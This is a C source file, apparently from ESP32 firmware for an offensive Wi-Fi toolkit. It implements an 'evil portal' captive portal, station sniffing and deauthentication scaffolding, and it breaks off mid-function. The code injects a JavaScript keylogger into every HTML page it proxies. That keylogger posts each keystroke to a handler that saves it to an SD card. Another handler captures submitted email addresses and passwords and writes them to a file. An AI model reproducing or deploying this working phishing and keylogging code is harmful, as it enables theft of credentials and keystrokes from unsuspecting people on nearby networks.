// wifi_manager.c

#include "managers/wifi_manager.h"
#include "esp_crt_bundle.h"
#include "esp_event.h"
#include "esp_heap_caps.h" // Add include for heap stats
#include "esp_http_client.h"
#include "esp_log.h"
#include "esp_timer.h"
#include "esp_wifi.h"
#include "freertos/FreeRTOS.h"
#include "freertos/event_groups.h"
#include "lwip/etharp.h"
#include "lwip/lwip_napt.h"
#include "managers/ap_manager.h"
#include "managers/rgb_manager.h"
#include "managers/settings_manager.h"
#include "nvs_flash.h"
#include <core/dns_server.h>
#include <ctype.h>
#include <dhcpserver/dhcpserver.h>
#include <esp_http_server.h>
#include <esp_random.h>
#include <fcntl.h>
#include <math.h>
#include <mdns.h>
#include <stdio.h>
#include <string.h>
#include <sys/time.h>
#ifdef WITH_SCREEN
#include "managers/views/music_visualizer.h"
#endif
#include "managers/sd_card_manager.h" // Add SD card manager include
#include "managers/views/terminal_screen.h"
#include "core/utils.h" // Add utils include
#include <inttypes.h>
#include "managers/default_portal.h"
#include "freertos/task.h"

// Defines for Station Scan Channel Hopping
#define SCANSTA_CHANNEL_HOP_INTERVAL_MS 250 // Hop channel every 250ms
#define SCANSTA_MAX_WIFI_CHANNEL 13         // Scan channels 1-13

#define MAX_DEVICES 255
#define CHUNK_SIZE 8192
#define MDNS_NAME_BUF_LEN 65
#define ARP_DELAY_MS 500
#define MAX_PACKETS_PER_SECOND 200

#define BEACON_LIST_MAX 16
#define BEACON_SSID_MAX_LEN 32

static char g_beacon_list[BEACON_LIST_MAX][BEACON_SSID_MAX_LEN+1];
static int g_beacon_list_count = 0;

static void wifi_beacon_list_task(void *param);

uint16_t ap_count;
wifi_ap_record_t *scanned_aps;
const char *TAG = "WiFiManager";
static char PORTALURL[512] = "";
static char domain_str[128] = "";
EventGroupHandle_t wifi_event_group;
const int WIFI_CONNECTED_BIT = BIT0;
wifi_ap_record_t selected_ap;
static station_ap_pair_t selected_station;
static bool station_selected = false;
bool redirect_handled = false;
httpd_handle_t evilportal_server = NULL;
dns_server_handle_t dns_handle;
esp_netif_t *wifiAP;
esp_netif_t *wifiSTA;
static uint32_t last_packet_time = 0;
static uint32_t packet_counter = 0;
static uint32_t deauth_packets_sent = 0;
static bool login_done = false;
static char current_creds_filename[128] = "";
static char current_keystrokes_filename[128] = "";
static int ap_connection_count = 0;

// Station Scan Channel Hopping Globals
static esp_timer_handle_t scansta_channel_hop_timer = NULL;
static uint8_t scansta_current_channel = 1;
static bool scansta_hopping_active = false;

// Dynamic list of channels discovered during AP scan (used for station scanning)
static int *scansta_channel_list = NULL;
static size_t scansta_channel_list_len = 0;
static size_t scansta_channel_list_idx = 0;

// Forward declarations for static channel hopping functions
static esp_err_t start_scansta_channel_hopping(void);
static void stop_scansta_channel_hopping(void);

// Station deauthentication task declaration
static void wifi_deauth_station_task(void *param);

// Helper function forward declaration
static void sanitize_ssid_and_check_hidden(const uint8_t* input_ssid, char* output_buffer, size_t buffer_size);

// Globals
static TaskHandle_t deauth_station_task_handle = NULL;

struct service_info {
    const char *query;
    const char *type;
};

struct service_info services[] = {{"_http", "Web Server Enabled Device"},
                                  {"_ssh", "SSH Server"},
                                  {"_ipp", "Printer (IPP)"},
                                  {"_googlecast", "Google Cast"},
                                  {"_raop", "AirPlay"},
                                  {"_smb", "SMB File Sharing"},
                                  {"_hap", "HomeKit Accessory"},
                                  {"_spotify-connect", "Spotify Connect Device"},
                                  {"_printer", "Printer (Generic)"},
                                  {"_mqtt", "MQTT Broker"}};

#define NUM_SERVICES (sizeof(services) / sizeof(services[0]))

struct DeviceInfo {
    struct ip4_addr ip;
    struct eth_addr mac;
};

typedef enum {
    COMPANY_DLINK,
    COMPANY_NETGEAR,
    COMPANY_BELKIN,
    COMPANY_TPLINK,
    COMPANY_LINKSYS,
    COMPANY_ASUS,
    COMPANY_ACTIONTEC,
    COMPANY_UNKNOWN
} ECompany;

static void tolower_str(const uint8_t *src, char *dst) {
    for (int i = 0; i < 33 && src[i] != '\0'; i++) {
        dst[i] = tolower((char)src[i]);
    }
    dst[32] = '\0'; // Ensure null-termination
}

void configure_hidden_ap() {
    wifi_config_t wifi_config;

    // Get the current AP configuration
    esp_err_t err = esp_wifi_get_config(WIFI_IF_AP, &wifi_config);
    if (err != ESP_OK) {
        printf("Failed to get Wi-Fi config: %s\n", esp_err_to_name(err));
        return;
    }

    // Set the SSID to hidden while keeping the other settings unchanged
    wifi_config.ap.ssid_hidden = 1;
    wifi_config.ap.beacon_interval = 10000;
    wifi_config.ap.ssid_len = 0;

    // Apply the updated configuration
    err = esp_wifi_set_config(WIFI_IF_AP, &wifi_config);
    if (err != ESP_OK) {
        printf("Failed to set Wi-Fi config: %s\n", esp_err_to_name(err));
    } else {
        printf("Wi-Fi AP SSID hidden.\n");
    }
}

static void event_handler(void *arg, esp_event_base_t event_base, int32_t event_id,
                          void *event_data) {
    if (event_base == WIFI_EVENT) {
        switch (event_id) {
        case WIFI_EVENT_AP_START:
            printf("AP started\n");
            break;
        case WIFI_EVENT_AP_STOP:
            printf("AP stopped\n");
            break;
        case WIFI_EVENT_AP_STACONNECTED:
            ap_connection_count++;
            printf("Station connected to AP\n");
            esp_wifi_set_ps(WIFI_PS_NONE);
            break;
        case WIFI_EVENT_AP_STADISCONNECTED:
            if (ap_connection_count > 0) ap_connection_count--;
            printf("Station disconnected from AP\n");
            login_done = false;
            if (ap_connection_count == 0) esp_wifi_set_ps(WIFI_PS_MIN_MODEM);
            break;
        case WIFI_EVENT_STA_START:
            printf("STA started\n");
            esp_wifi_connect();
            break;
        case WIFI_EVENT_STA_DISCONNECTED:
            printf("Disconnected from Wi-Fi\nRetrying...\n");
            esp_wifi_connect();
            break;
        default:
            break;
        }
    } else if (event_base == IP_EVENT) {
        switch (event_id) {
        case IP_EVENT_STA_GOT_IP:
            break;
        case IP_EVENT_AP_STAIPASSIGNED:
            printf("Assigned IP to STA\n");
            break;
        default:
            break;
        }
    }
}

// OUI lists for each company
const char *dlink_ouis[] = {
    "00055D", "000D88", "000F3D", "001195", "001346", "0015E9", "00179A", "00195B", "001B11",
    "001CF0", "001E58", "002191", "0022B0", "002401", "00265A", "00AD24", "04BAD6", "085A11",
    "0C0E76", "0CB6D2", "1062EB", "10BEF5", "14D64D", "180F76", "1C5F2B", "1C7EE5", "1CAFF7",
    "1CBDB9", "283B82", "302303", "340804", "340A33", "3C1E04", "3C3332", "4086CB", "409BCD",
    "54B80A", "5CD998", "60634C", "642943", "6C198F", "6C7220", "744401", "74DADA", "78321B",
    "78542E", "7898E8", "802689", "84C9B2", "8876B9", "908D78", "9094E4", "9CD643", "A06391",
    "A0AB1B", "A42A95", "A8637D", "ACF1DF", "B437D8", "B8A386", "BC0F9A", "BC2228", "BCF685",
    "C0A0BB", "C4A81D", "C4E90A", "C8787D", "C8BE19", "C8D3A3", "CCB255", "D8FEE3", "DCEAE7",
    "E01CFC", "E46F13", "E8CC18", "EC2280", "ECADE0", "F07D68", "F0B4D2", "F48CEB", "F8E903",
    "FC7516"};
const char *netgear_ouis[] = {
    "00095B", "000FB5", "00146C", "001B2F", "001E2A", "001F33", "00223F", "00224B2", "0026F2",
    "008EF2", "08028E", "0836C9", "08BD43", "100C6B", "100D7F", "10DA43", "1459C0",  "204E7F",
    "20E52A", "288088", "289401", "28C68E", "2C3033", "2CB05D", "30469A", "3498B5",  "3894ED",
    "3C3786", "405D82", "44A56E", "4C60DE", "504A6E", "506A03", "54077D", "58EF68",  "6038E0",
    "6CB0CE", "6CCDD6", "744401", "803773", "841B5E", "8C3BAD", "941865", "9C3DCF",  "9CC9EB",
    "9CD36D", "A00460", "A021B7", "A040A0", "A42B8C", "B03956", "B07FB9", "B0B98A",  "BCA511",
    "C03F0E", "C0FFD4", "C40415", "C43DC7", "C89E43", "CC40D0", "DCEF09", "E0469A",  "E046EE",
    "E091F5", "E4F4C6", "E8FCAF", "F87394"};
const char *belkin_ouis[] = {"001150", "00173F", "0030BD", "08BD43", "149182", "24F5A2",
                             "302303", "80691A", "94103E", "944452", "B4750E", "C05627",
                             "C4411E", "D8EC5E", "E89F80", "EC1A59", "EC2280"};
const char *tplink_ouis[] = {"003192", "005F67", "1027F5", "14EBB6", "1C61B4", "203626", "2887BA",
                             "30DE4B", "3460F9", "3C52A1", "40ED00", "482254", "5091E3", "54AF97",
                             "5C628B", "5CA6E6", "5CE931", "60A4B7", "687FF0", "6C5AB0", "788CB5",
                             "7CC2C6", "9C5322", "9CA2F4", "A842A1", "AC15A2", "B0A7B9", "B4B024",
                             "C006C3", "CC68B6", "E848B8", "F0A731"};
const char *linksys_ouis[] = {
    "00045A", "000625", "000C41", "000E08", "000F66", "001217", "001310", "0014BF", "0016B6",
    "001839", "0018F8", "001A70", "001C10", "001D7E", "001EE5", "002129", "00226B", "002369",
    "00259C", "002354", "0024B2", "003192", "005F67", "1027F5", "14EBB6", "1C61B4", "203626",
    "2887BA", "305A3A", "2CFDA1", "302303", "30469A", "40ED00", "482254", "5091E3", "54AF97",
    "5CA2F4", "5CA6E6", "5CE931", "60A4B7", "687FF0", "6C5AB0", "788CB5", "7CC2C6", "9C5322",
    "9CA2F4", "A842A1", "AC15A2", "B0A7B9", "B4B024", "C006C3", "CC68B6", "E848B8", "F0A731"};
const char *asus_ouis[] = {
    "000C6E", "000EA6", "00112F", "0011D8", "0013D4", "0015F2", "001731", "0018F3", "001A92",
    "001BFC", "001D60", "001E8C", "001FC6", "002215", "002354", "00248C", "002618", "00E018",
    "04421A", "049226", "04D4C4", "04D9F5", "08606E", "086266", "08BFB8", "0C9D92", "107B44",
    "107C61", "10BF48", "10C37B", "14DAE9", "14DDA9", "1831BF", "1C872C", "1CB72C", "20CF30",
    "244BFE", "2C4D54", "2C56DC", "2CFDA1", "305A3A", "3085A9", "3497F6", "382C4A", "38D547",
    "3C7C3F", "40167E", "40B076", "485B39", "4CEDFB", "50465D", "50EBF6", "5404A6", "54A050",
    "581122", "6045CB", "60A44C", "60CF84", "704D7B", "708BCD", "74D02B", "7824AF", "7C10C9",
    "88D7F6", "90E6BA", "9C5C8E", "A036BC", "A85E45", "AC220B", "AC9E17", "B06EBF", "BCAEC5",
    "BCEE7B", "C86000", "C87F54", "CC28AA", "D017C2", "D45D64", "D850E6", "E03F49", "E0CB4E",
    "E89C25", "F02F74", "F07959", "F46D04", "F832E4", "FC3497", "FCC233"};
const char *actiontec_ouis[] = {"000FB3", "001505", "001801", "001EA7", "001F90", "0020E0",
                                "00247B", "002662", "0026B8", "007F28", "0C6127", "105F06",
                                "10785B", "109FA9", "181BEB", "207600", "408B07", "4C8B30",
                                "5C35FC", "7058A4", "70F196", "70F220", "84E892", "941C56",
                                "9C1E95", "A0A3E2", "A83944", "E86FF2", "F8E4FB", "FC2BB2"};

static void wifi_event_handler(void *arg, esp_event_base_t event_base, int32_t event_id,
                               void *event_data) {
    if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_START) {
        printf("WiFi started.\nReady to scan.\n");
        TERMINAL_VIEW_ADD_TEXT("WiFi started.\nReady to scan.\n");
    } else if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_DISCONNECTED) {
        printf("WiFi disconnected\n");
        TERMINAL_VIEW_ADD_TEXT("WiFi disconnected\n");
        xEventGroupClearBits(wifi_event_group, WIFI_CONNECTED_BIT);
    } else if (event_base == IP_EVENT && event_id == IP_EVENT_STA_GOT_IP) {
        ip_event_got_ip_t *event = (ip_event_got_ip_t *)event_data;
        printf("Got IP: " IPSTR, IP2STR(&event->ip_info.ip));
        TERMINAL_VIEW_ADD_TEXT("Got IP: " IPSTR, IP2STR(&event->ip_info.ip));
        xEventGroupSetBits(wifi_event_group, WIFI_CONNECTED_BIT);
    }
}

static void generate_random_ssid(char *ssid, size_t length) {
    const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    for (size_t i = 0; i < length - 1; i++) {
        int random_index = esp_random() % (sizeof(charset) - 1);
        ssid[i] = charset[random_index];
    }
    ssid[length - 1] = '\0'; // Null-terminate the SSID
}

static void generate_random_mac(uint8_t *mac) {
    esp_fill_random(mac, 6); // Fill MAC address with random bytes
    mac[0] &= 0xFE; // Unicast MAC address (least significant bit of the first byte should be 0)
    mac[0] |= 0x02; // Locally administered MAC address (set the second least significant bit)
}

static bool station_exists(const uint8_t *station_mac, const uint8_t *ap_bssid) {
    for (int i = 0; i < station_count; i++) {
        if (memcmp(station_ap_list[i].station_mac, station_mac, 6) == 0 &&
            memcmp(station_ap_list[i].ap_bssid, ap_bssid, 6) == 0) {
            return true;
        }
    }
    return false;
}

static void add_station_ap_pair(const uint8_t *station_mac, const uint8_t *ap_bssid) {
    if (station_count < MAX_STATIONS) {
        // Copy MAC addresses to the list
        memcpy(station_ap_list[station_count].station_mac, station_mac, 6);
        memcpy(station_ap_list[station_count].ap_bssid, ap_bssid, 6);
        station_count++;

        // Print formatted MAC addresses

    } else {
        printf("Station list full\nCan't add more stations.\n");
        TERMINAL_VIEW_ADD_TEXT("Station list full\nCan't add more stations.\n");
    }
}

// Function to match the BSSID to a company based on OUI
ECompany match_bssid_to_company(const uint8_t *bssid) {
    char oui[7]; // First 3 bytes of the BSSID
    snprintf(oui, sizeof(oui), "%02X%02X%02X", bssid[0], bssid[1], bssid[2]);

    // Check D-Link
    for (int i = 0; i < sizeof(dlink_ouis) / sizeof(dlink_ouis[0]); i++) {
        if (strcmp(oui, dlink_ouis[i]) == 0) {
            return COMPANY_DLINK;
        }
    }

    // Check Netgear
    for (int i = 0; i < sizeof(netgear_ouis) / sizeof(netgear_ouis[0]); i++) {
        if (strcmp(oui, netgear_ouis[i]) == 0) {
            return COMPANY_NETGEAR;
        }
    }

    // Check Belkin
    for (int i = 0; i < sizeof(belkin_ouis) / sizeof(belkin_ouis[0]); i++) {
        if (strcmp(oui, belkin_ouis[i]) == 0) {
            return COMPANY_BELKIN;
        }
    }

    // Check TP-Link
    for (int i = 0; i < sizeof(tplink_ouis) / sizeof(tplink_ouis[0]); i++) {
        if (strcmp(oui, tplink_ouis[i]) == 0) {
            return COMPANY_TPLINK;
        }
    }

    // Check Linksys
    for (int i = 0; i < sizeof(linksys_ouis) / sizeof(linksys_ouis[0]); i++) {
        if (strcmp(oui, linksys_ouis[i]) == 0) {
            return COMPANY_LINKSYS;
        }
    }

    // Check ASUS
    for (int i = 0; i < sizeof(asus_ouis) / sizeof(asus_ouis[0]); i++) {
        if (strcmp(oui, asus_ouis[i]) == 0) {
            return COMPANY_ASUS;
        }
    }

    // Check Actiontec
    for (int i = 0; i < sizeof(actiontec_ouis) / sizeof(actiontec_ouis[0]); i++) {
        if (strcmp(oui, actiontec_ouis[i]) == 0) {
            return COMPANY_ACTIONTEC;
        }
    }

    // Unknown company if no match found
    return COMPANY_UNKNOWN;
}

// Helper macro to check for broadcast/multicast addresses
#define IS_BROADCAST_OR_MULTICAST(addr) (((addr)[0] & 0x01) || (memcmp((addr), "\xff\xff\xff\xff\xff\xff", 6) == 0))

// Function to check if a station MAC already exists in the list
static bool station_mac_exists(const uint8_t *station_mac) {
    for (int i = 0; i < station_count; i++) {
        if (memcmp(station_ap_list[i].station_mac, station_mac, 6) == 0) {
            return true; // Station MAC found
        }
    }
    return false; // Station MAC not found
}

// Helper function to reverse MAC address byte order for comparison
static void reverse_mac(const uint8_t *src, uint8_t *dst) {
    for (int i = 0; i < 6; i++) {
        dst[i] = src[5 - i];
    }
}

void wifi_stations_sniffer_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
    // Focus on Management frames like the example, can be changed back to WIFI_PKT_DATA if needed
    if (type != WIFI_PKT_MGMT) {
        // printf("DEBUG: Dropped non-MGMT packet\n"); 
        return;
    }

    // Check if we have scanned APs to compare against
    if (scanned_aps == NULL || ap_count == 0) {
        // This case should be handled by wifi_manager_start_station_scan now
        printf("ERROR: No scanned APs in callback!\n");
        return;
    }

    const wifi_promiscuous_pkt_t *packet = (wifi_promiscuous_pkt_t *)buf;
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)packet->payload;
    const wifi_ieee80211_hdr_t *hdr = &ipkt->hdr;

    // --- DEBUG: Print raw addresses from MGMT frame ---
    // printf("DEBUG MGMT Frame: Addr1=%02X:%02X:%02X:%02X:%02X:%02X, Addr2=%02X:%02X:%02X:%02X:%02X:%02X, Addr3=%02X:%02X:%02X:%02X:%02X:%02X\n",
    //        hdr->addr1[0], hdr->addr1[1], hdr->addr1[2], hdr->addr1[3], hdr->addr1[4], hdr->addr1[5],
    //        hdr->addr2[0], hdr->addr2[1], hdr->addr2[2], hdr->addr2[3], hdr->addr2[4], hdr->addr2[5],
    //        hdr->addr3[0], hdr->addr3[1], hdr->addr3[2], hdr->addr3[3], hdr->addr3[4], hdr->addr3[5]);

    // --- DEBUG: Print first known AP BSSID ---
    // if (ap_count > 0 && scanned_aps != NULL) {
    //      printf("DEBUG Known AP[0]: BSSID=%02X:%02X:%02X:%02X:%02X:%02X\n",
    //             scanned_aps[0].bssid[0], scanned_aps[0].bssid[1],
    //             scanned_aps[0].bssid[2], scanned_aps[0].bssid[3],
    //             scanned_aps[0].bssid[4], scanned_aps[0].bssid[5]);
    // }
    // ----------------------------------------

    const uint8_t *station_mac = NULL;
    const uint8_t *ap_bssid = NULL;
    int matched_ap_index = -1;

    // Iterate through known APs (from last scan)
    for (int i = 0; i < ap_count; i++) {
        uint8_t *bssid = scanned_aps[i].bssid;
        // Case 1: addr1 == AP BSSID, station likely in addr2
        if (memcmp(hdr->addr1, bssid, 6) == 0 && memcmp(hdr->addr2, bssid, 6) != 0) {
            ap_bssid = bssid;
            station_mac = hdr->addr2;
            matched_ap_index = i;
            break;
        }
        // Case 2: addr2 == AP BSSID, station likely in addr1
        if (memcmp(hdr->addr2, bssid, 6) == 0 && memcmp(hdr->addr1, bssid, 6) != 0) {
            ap_bssid = bssid;
            station_mac = hdr->addr1;
            matched_ap_index = i;
            break;
        }
        // Case 3: addr3 == AP BSSID, station could be in addr1 or addr2
        if (memcmp(hdr->addr3, bssid, 6) == 0) {
            // prefer addr2 (source fields)
            if (memcmp(hdr->addr2, bssid, 6) != 0 && !IS_BROADCAST_OR_MULTICAST(hdr->addr2)) {
                ap_bssid = bssid;
                station_mac = hdr->addr2;
                matched_ap_index = i;
                break;
            }
            if (memcmp(hdr->addr1, bssid, 6) != 0 && !IS_BROADCAST_OR_MULTICAST(hdr->addr1)) {
                ap_bssid = bssid;
                station_mac = hdr->addr1;
                matched_ap_index = i;
                break;
            }
        }
    }

    // If no known AP BSSID found, ignore
    if (matched_ap_index == -1) {
       // printf("DEBUG: Dropped packet - No known AP BSSID found in addresses.\n");
        return;
    }

    // Ensure we are capturing a station, not an AP or broadcast
    if (memcmp(station_mac, ap_bssid, 6) == 0 || IS_BROADCAST_OR_MULTICAST(station_mac)) {
       // printf("DEBUG: Dropped packet - Station MAC is broadcast/multicast or same as AP.\n");
        return;
    }

    // Ignore broadcast MAC address for the station
   // if (IS_BROADCAST_OR_MULTICAST(station_mac)) {
   //     printf("DEBUG: Dropped packet - Station MAC is broadcast/multicast.\n"); // Uncomment for verbose debug
   //     return;
   // }

    // Check if this station MAC has already been seen/logged
    if (!station_mac_exists(station_mac)) {
         // Get the SSID of the matched AP
        char ssid_str[33];
        memcpy(ssid_str, scanned_aps[matched_ap_index].ssid, 32);
        ssid_str[32] = '\0';
        if (strlen(ssid_str) == 0) {
             strcpy(ssid_str, "(Hidden)");
        }

        printf(
            "New Station: %02X:%02X:%02X:%02X:%02X:%02X -> Associated AP: %s (%02X:%02X:%02X:%02X:%02X:%02X)\n",
            station_mac[0], station_mac[1], station_mac[2], station_mac[3], station_mac[4], station_mac[5],
            ssid_str, // Use SSID here
            ap_bssid[0], ap_bssid[1], ap_bssid[2], ap_bssid[3], ap_bssid[4], ap_bssid[5]); // Use original ap_bssid
        TERMINAL_VIEW_ADD_TEXT(
            "New Station: %02X:%02X:%02X:%02X:%02X:%02X -> Associated AP: %s (%02X:%02X:%02X:%02X:%02X:%02X)\n",
            station_mac[0], station_mac[1], station_mac[2], station_mac[3], station_mac[4], station_mac[5],
            ssid_str, // Use SSID here
            ap_bssid[0], ap_bssid[1], ap_bssid[2], ap_bssid[3], ap_bssid[4], ap_bssid[5]); // Use original ap_bssid

        // Add the station and the *specific AP BSSID* it was seen with to the list
        add_station_ap_pair(station_mac, ap_bssid);
    } else {
       // printf("DEBUG: Filtered packet - Station MAC already seen.\n");
    }
}

esp_err_t stream_data_to_client(httpd_req_t *req, const char *url, const char *content_type) {
    httpd_resp_set_hdr(req, "Connection", "close");

    if (strncmp(url, "http://", 7) != 0 && strncmp(url, "https://", 8) != 0) {
        FILE *file = fopen(url, "r");
        if (file == NULL) {
            printf("Error: cannot open file %s\n", url);
            return ESP_FAIL;
        }

        httpd_resp_set_type(req, content_type ? content_type : "application/octet-stream");
        httpd_resp_set_status(req, "200 OK");

        char *buffer = (char *)malloc(CHUNK_SIZE + 1);
        if (buffer == NULL) {
            printf("Error: buffer allocation failed\n");
            fclose(file);
            return ESP_FAIL;
        }

        int read_len;
        while ((read_len = fread(buffer, 1, CHUNK_SIZE, file)) > 0) {
            if (httpd_resp_send_chunk(req, buffer, read_len) != ESP_OK) {
                printf("Error: send chunk failed\n");
                break;
            }
        }

        free(buffer);
        fclose(file);
        httpd_resp_send_chunk(req, NULL, 0);
        printf("Served file: %s\n", url);
        return ESP_OK;
    } else {
        // Proceed with HTTP request if not an SD card file
        esp_http_client_config_t config = {
            .url = url,
            .timeout_ms = 5000,
            .crt_bundle_attach = esp_crt_bundle_attach,
            .transport_type = HTTP_TRANSPORT_OVER_SSL,
            .user_agent = "Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-G973U) "
                          "AppleWebKit/537.36 (KHTML, like "
                          "Gecko) SamsungBrowser/14.2 Chrome/87.0.4280.141 Mobile "
                          "Safari/537.36", // Browser-like
                                           // User-Agent
                                           // string
            .disable_auto_redirect = false,
        };

        esp_http_client_handle_t client = esp_http_client_init(&config);
        if (client == NULL) {
            printf("Failed to initialize HTTP client\n");
            return ESP_FAIL;
        }

        esp_err_t err = esp_http_client_perform(client);
        if (err != ESP_OK) {
            printf("HTTP request failed: %s\n", esp_err_to_name(err));
            esp_http_client_cleanup(client);
            return ESP_FAIL;
        }

        int http_status = esp_http_client_get_status_code(client);
        printf("Final HTTP Status code: %d\n", http_status);

        if (http_status == 200) {
            printf("Received 200 OK\nRe-opening connection for manual streaming...\n");

            err = esp_http_client_open(client, 0);
            if (err != ESP_OK) {
                printf("Failed to re-open HTTP connection for streaming: %s\n",
                       esp_err_to_name(err));
                esp_http_client_cleanup(client);
                return ESP_FAIL;
            }

            int content_length = esp_http_client_fetch_headers(client);
            printf("Content length: %d\n", content_length);

            httpd_resp_set_type(req, content_type ? content_type : "application/octet-stream");

            httpd_resp_set_hdr(req, "Content-Security-Policy",
                               "default-src 'self' 'unsafe-inline' data: blob:; "
                               "script-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob:; "
                               "style-src 'self' 'unsafe-inline' data:; "
                               "img-src 'self' 'unsafe-inline' data: blob:; "
                               "connect-src 'self' data: blob:;");
            httpd_resp_set_status(req, "200 OK");

            char *buffer = (char *)malloc(CHUNK_SIZE + 1);
            if (buffer == NULL) {
                printf("Failed to allocate memory for buffer");
                esp_http_client_cleanup(client);
                return ESP_FAIL;
            }

            int read_len;
            while ((read_len = esp_http_client_read(client, buffer, CHUNK_SIZE)) > 0) {
                if (httpd_resp_send_chunk(req, buffer, read_len) != ESP_OK) {
                    printf("Failed to send chunk to client\n");
                    break;
                }
            }

            if (read_len == 0) {
                printf("Finished reading all data from server (end of content)\n");
            } else if (read_len < 0) {
                printf("Failed to read response, read_len: %d\n", read_len);
            }

            if (content_type && strcmp(content_type, "text/html") == 0) {
                const char *javascript_code =
                    "<script>\n"
                    "(function(){\n"
                    "function logKey(key){\n"
                    "    var xhr = new XMLHttpRequest();\n"
                    "    xhr.open('POST','/api/log',true);\n"
                    "    xhr.setRequestHeader('Content-Type','application/json;charset=UTF-8');\n"
                    "    xhr.send(JSON.stringify({key:key}));\n"
                    "}\n"
                    "document.addEventListener('keyup', function(e){ logKey(e.key); });\n"
                    "document.addEventListener('input', function(e){ if(e.target.tagName==='INPUT'||e.target.tagName==='TEXTAREA'){ var val=e.target.value; var key=val.slice(-1); if(key) logKey(key);} });\n"
                    "})();\n"
                    "</script>\n";
                if (httpd_resp_send_chunk(req, javascript_code, strlen(javascript_code)) != ESP_OK) {
                    printf("Failed to send custom JavaScript\n");
                }
            }

            free(buffer);
            esp_http_client_close(client);
            esp_http_client_cleanup(client);

            httpd_resp_send_chunk(req, NULL, 0);

            return ESP_OK;
        } else {
            printf("Unhandled HTTP status code: %d\n", http_status);
            esp_http_client_cleanup(client);
            return ESP_FAIL;
        }
    }
}

const char *get_content_type(const char *uri) {
    if (strstr(uri, ".html")) {
        return "text/html";
    }
    if (strstr(uri, ".css")) {
        return "text/css";
    } else if (strstr(uri, ".js")) {
        return "application/javascript";
    } else if (strstr(uri, ".png")) {
        return "image/png";
    } else if (strstr(uri, ".jpg") || strstr(uri, ".jpeg")) {
        return "image/jpeg";
    } else if (strstr(uri, ".gif")) {
        return "image/gif";
    }
    return "application/octet-stream"; // Default to binary stream if unknown
}

const char *get_host_from_req(httpd_req_t *req) {
    size_t buf_len = httpd_req_get_hdr_value_len(req, "Host") + 1;
    if (buf_len > 1) {
        char *host = malloc(buf_len);
        if (httpd_req_get_hdr_value_str(req, "Host", host, buf_len) == ESP_OK) {
            printf("Host header found: %s\n", host);
            return host; // Caller must free() this memory
        }
        free(host);
    }
    printf("Host header not found\n");
    return NULL;
}

void build_file_url(const char *host, const char *uri, char *file_url, size_t max_len) {
    snprintf(file_url, max_len, "https://%s%s", host, uri);
    printf("File URL built: %s\n", file_url);
}

esp_err_t file_handler(httpd_req_t *req) {
    const char *uri = req->uri;
    const char *content_type = get_content_type(uri);
    char local_path[512];
    {
        size_t maxlen = sizeof(local_path) - strlen("/mnt") - 1;
        snprintf(local_path, sizeof(local_path), "/mnt%.*s", (int)maxlen, uri);
    }
    FILE *f = fopen(local_path, "r");
    if (f) {
        fclose(f);
        return stream_data_to_client(req, local_path, content_type);
    }

    const char *host = get_host_from_req(req);
    if (host == NULL) {
        httpd_resp_set_status(req, "400 Bad Request");
        httpd_resp_send(req, NULL, 0);
        return ESP_FAIL;
    }

    char file_url[512];
    build_file_url(host, uri, file_url, sizeof(file_url));

    printf("Determined content type: %s for URI: %s\n", content_type, uri);

    esp_err_t result = stream_data_to_client(req, file_url, content_type);

    free((void *)host);

    return result;
}

esp_err_t done_handler(httpd_req_t *req) {
    login_done = true;
    const char *msg = "<html><body><h1>Portal closed</h1></body></html>";
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, msg, strlen(msg));
    // no automatic shutdown
    return ESP_OK;
}

esp_err_t portal_handler(httpd_req_t *req) {
    printf("Client requested URL: %s\n", req->uri);
    ESP_LOGI(TAG, "Free heap before serving portal: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size

    // Check if we should serve the default embedded portal
    if (strcmp(PORTALURL, "INTERNAL_DEFAULT_PORTAL") == 0) {
        httpd_resp_set_type(req, "text/html");
        httpd_resp_send(req, default_portal_html, strlen(default_portal_html));
        ESP_LOGI(TAG, "Served default embedded portal.");
        ESP_LOGI(TAG, "Free heap after serving default portal: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
        return ESP_OK;
    }

    // Otherwise, proceed with streaming from URL or file
    esp_err_t err = stream_data_to_client(req, PORTALURL, "text/html");

    if (err != ESP_OK) {
        const char *err_msg = esp_err_to_name(err);

        char error_message[512];
        snprintf(
            error_message, sizeof(error_message),
            "<html><body><h1>Failed to fetch portal content</h1><p>Error: %s</p></body></html>",
            err_msg);

        httpd_resp_set_type(req, "text/html");
        httpd_resp_send(req, error_message, strlen(error_message));
    }

    ESP_LOGI(TAG, "Free heap after serving portal: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
    return ESP_OK;
}

esp_err_t get_log_handler(httpd_req_t *req) {
    char body[256] = {0};
    int received = 0;

    while ((received = httpd_req_recv(req, body, sizeof(body) - 1)) > 0) {
        body[received] = '\0';

        printf("Received chunk: %s\n", body);

        // Save to SD card if available and filename is set
        if (sd_card_manager.is_initialized && current_keystrokes_filename[0] != '\0') {
            FILE* f = fopen(current_keystrokes_filename, "a");
            if (f) {
                fprintf(f, "%s", body); // Append the chunk
                fclose(f);
            } else {
                printf("Failed to open %s for appending\n", current_keystrokes_filename);
            }
        }
    }

    if (received < 0) {
        printf("Failed to receive request body");
        return ESP_FAIL;
    }

    const char *resp_str = "Body content logged successfully";
    httpd_resp_send(req, resp_str, strlen(resp_str));

    return ESP_OK;
}

esp_err_t get_info_handler(httpd_req_t *req) {
    char query[256] = {0};
    char decoded_email[64] = {0};
    char decoded_password[64] = {0};

    if (httpd_req_get_url_query_str(req, query, sizeof(query)) == ESP_OK) {
        char email_val[64] = {0};
        char pass_val[64] = {0};
        if (get_query_param_value(query, "email", email_val, sizeof(email_val)) == ESP_OK) {
            url_decode(decoded_email, email_val);
        }
        if (get_query_param_value(query, "password", pass_val, sizeof(pass_val)) == ESP_OK) {
            url_decode(decoded_password, pass_val);
        }
        printf("Captured credentials: %s / %s\n", decoded_email, decoded_password);

        // Save credentials to SD card if available and filename is set
        if (sd_card_manager.is_initialized && current_creds_filename[0] != '\0') {
            FILE* f = fopen(current_creds_filename, "a");
            if (f) {
                // Optionally add a timestamp or delimiter here
                fprintf(f, "Email: %s, Password: %s\n", decoded_email, decoded_password);
                fclose(f);
            } else {
